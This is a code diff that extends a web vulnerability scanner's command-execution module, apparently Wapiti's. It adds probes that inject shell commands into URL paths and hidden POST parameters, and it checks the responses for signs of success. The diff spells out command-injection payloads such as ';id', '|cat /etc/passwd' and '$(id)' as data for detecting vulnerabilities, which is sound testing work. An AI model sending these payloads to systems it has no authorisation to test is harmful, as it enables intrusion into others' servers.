@@ -37,6 +37,8 @@ from wapitiCore.parsers.ini_payload_parser import IniPayloadReader, replace_tags
 class ModuleExec(Attack):
     """
     Detect scripts vulnerable to command and/or code execution.
+
+    Also tests URL path-based command injection (e.g., /;id)
     """
     name = "exec"
 
@@ -44,6 +46,7 @@ class ModuleExec(Attack):
         super().__init__(crawler, persister, attack_options, crawler_configuration)
         self.false_positive_timeouts = set()
         self.mutator = self.get_mutator()
+        self.tested_paths = set()  # Track tested base URLs for path injection
 
     def get_payloads(self, _: Optional[Request] = None, __: Optional[Parameter] = None) -> Iterator[PayloadInfo]:
         """Load the payloads from the specified file"""
@@ -68,6 +71,153 @@ class ModuleExec(Attack):
                 return vuln_info
         return ""
 
+    async def _test_path_injection(self, request: Request) -> bool:
+        """Test command injection in URL path (e.g., /;id)"""
+        from urllib.parse import urlparse
+
+        parsed = urlparse(request.url)
+        base_url = f"{parsed.scheme}://{parsed.netloc}"
+
+        # Skip if already tested this base URL
+        if base_url in self.tested_paths:
+            return False
+        self.tested_paths.add(base_url)
+
+        # Key payloads for path-based command injection detection
+        path_payloads = [
+            # Linux command injection
+            (";id", "uid=", "Command injection via semicolon in URL path"),
+            ("|id", "uid=", "Command injection via pipe in URL path"),
+            ("$(id)", "uid=", "Command injection via command substitution in URL path"),
+            ("`id`", "uid=", "Command injection via backticks in URL path"),
+            (";cat /etc/passwd", "root:", "Command injection reading /etc/passwd in URL path"),
+            ("|cat /etc/passwd", "root:", "Command injection reading /etc/passwd in URL path"),
+            # Windows command injection
+            ("|dir", "Volume", "Windows command injection in URL path"),
+            ("&dir", "Volume", "Windows command injection in URL path"),
+            (";whoami", "\\", "Windows whoami injection in URL path"),
+        ]
+
+        for payload, expected, description in path_payloads:
+            # Test payload in path: /payload
+            test_url = f"{base_url}/{payload}"
+            test_request = Request(test_url, method="GET")
+
+            log_verbose(f"[¨] Testing path command injection: {test_url}")
+
+            try:
+                test_response = await self.crawler.async_send(test_request)
+            except (ReadTimeout, RequestError):
+                self.network_errors += 1
+                continue
+
+            if expected.lower() in test_response.content.lower():
+                vuln_message = f"{description}: {test_url}"
+
+                await self.add_critical(
+                    finding_class=CommandExecutionFinding,
+                    request=test_request,
+                    info=vuln_message,
+                    parameter="URL path",
+                    response=test_response
+                )
+
+                log_red("---")
+                log_red(f"[!] {description}")
+                log_red(f"[!] URL: {test_url}")
+                log_red("---")
+                return True  # Found vulnerability, stop testing this URL
+
+            # Also check for warning-based detection
+            warning_info = self._find_warning_in_response(test_response.content)
+            if warning_info:
+                vuln_message = f"{warning_info} in URL path: {test_url}"
+
+                await self.add_critical(
+                    finding_class=CommandExecutionFinding,
+                    request=test_request,
+                    info=vuln_message,
+                    parameter="URL path",
+                    response=test_response
+                )
+
+                log_red("---")
+                log_red(f"[!] {warning_info} in URL path")
+                log_red(f"[!] URL: {test_url}")
+                log_red("---")
+                return True
+
+        return False
+
+    async def _test_parameter_fuzzing(self, request: Request) -> bool:
+        """Test common hidden parameter names for command injection"""
+        # Only fuzz POST requests
+        if request.method != "POST":
+            return False
+
+        # Common parameter names used for command execution
+        param_names = [
+            "cmd", "command", "exec", "execute", "run", "shell",
+            "cmd_input", "command_input", "exec_input", "input",
+            "system", "syscmd", "do", "action", "code"
+        ]
+
+        # Simple payloads that work with strict filters (only lowercase letters)
+        test_payloads = [
+            ("id", ["uid=", "gid="]),
+            ("whoami", ["root", "www-data", "apache", "nginx", "chall", "user"]),
+            ("pwd", ["/var/www", "/home", "/app", "/usr", "/root"]),
+        ]
+
+        for param_name in param_names:
+            for payload, expected_patterns in test_payloads:
+                # Create a new request with the fuzzing parameter
+                if request.post_params:
+                    # Add to existing POST params
+                    new_params = [(k, v) for k, v in request.post_params if k != param_name]
+                    new_params.append((param_name, payload))
+                else:
+                    new_params = [(param_name, payload)]
+
+                test_request = Request(
+                    request.url,
+                    method="POST",
+                    post_params=new_params,
+                    referer=request.referer
+                )
+
+                log_verbose(f"[¨] Testing hidden parameter {param_name}={payload}")
+
+                try:
+                    test_response = await self.crawler.async_send(test_request)
+                except (ReadTimeout, RequestError):
+                    self.network_errors += 1
+                    continue
+
+                # Check if any expected pattern is in response
+                response_lower = test_response.content.lower()
+                for expected in expected_patterns:
+                    if expected.lower() in response_lower:
+                        vuln_message = f"Command injection via hidden parameter {param_name}"
+
+                        await self.add_critical(
+                            finding_class=CommandExecutionFinding,
+                            request=test_request,
+                            info=vuln_message,
+                            parameter=param_name,
+                            response=test_response
+                        )
+
+                        log_red("---")
+                        log_red(f"[!] Command injection found via parameter fuzzing")
+                        log_red(f"[!] Hidden parameter: {param_name}")
+                        log_red(f"[!] Payload: {payload}")
+                        log_red(f"[!] URL: {request.url}")
+                        log_red("---")
+                        return True  # Found vulnerability
+
+        return False
+
     async def attack(self, request: Request, response: Optional[Response] = None):
         warned = False
         timeouted = False
@@ -75,6 +225,12 @@ class ModuleExec(Attack):
         saw_internal_error = False
         current_parameter = None
         vulnerable_parameter = False
+
+        # First, test URL path-based command injection
+        await self._test_path_injection(request)
+
+        # Second, try fuzzing common hidden parameter names for POST requests
+        await self._test_parameter_fuzzing(request)
 
         for mutated_request, parameter, payload_info in self.mutator.mutate(request, self.get_payloads):
 
